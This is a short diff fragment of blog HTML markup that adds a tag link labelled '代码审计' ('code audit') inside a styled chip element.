+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
                     </a>
                     
                 </div>
